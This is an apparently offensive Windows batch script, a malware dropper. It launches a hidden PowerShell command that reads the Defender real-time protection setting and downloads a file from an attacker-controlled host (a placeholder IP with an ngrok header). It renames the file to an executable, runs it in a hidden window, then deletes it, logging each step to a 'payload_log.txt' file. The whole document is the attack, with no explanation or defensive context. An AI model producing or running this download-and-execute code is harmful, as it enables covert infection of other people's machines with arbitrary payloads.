@echo off
set LOG=%TEMP%\payload_log.txt
echo [*] Starting script at %TIME% > "%LOG%"

powershell -nop -w hidden -Command ^
"$ErrorActionPreference = 'SilentlyContinue'; ^
$regPath = 'HKLM:\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection'; ^
$rtp = (Get-ItemProperty -Path $regPath -Name 'DisableRealtimeMonitoring').DisableRealtimeMonitoring; ^
Add-Content '%LOG%' '[+] RTP OFF. Downloading...'; ^
$url = 'http://192.168.2.135/pl.txt';  # <- Replace with actual IP ^
$txtPath = \"$env:TEMP\\pl.txt\"; ^
$exePath = \"$env:TEMP\\pl.exe\"; ^
$wc = New-Object System.Net.WebClient; ^
$wc.Headers.Add('ngrok-skip-browser-warning', '1'); ^
$wc.DownloadFile($url, $txtPath); ^
Rename-Item -Path $txtPath -NewName $exePath; ^
Add-Content '%LOG%' '[+] Renamed pl.txt to pl.exe'; ^
Start-Process -FilePath $exePath -WindowStyle Hidden; ^
Add-Content '%LOG%' '[+] Executed pl.exe'; ^
Start-Sleep -Seconds 2; ^
Remove-Item $exePath -Force; ^
Add-Content '%LOG%' '[+] Deleted pl.exe'"

echo [*] Script finished at %TIME% >> "%LOG%"
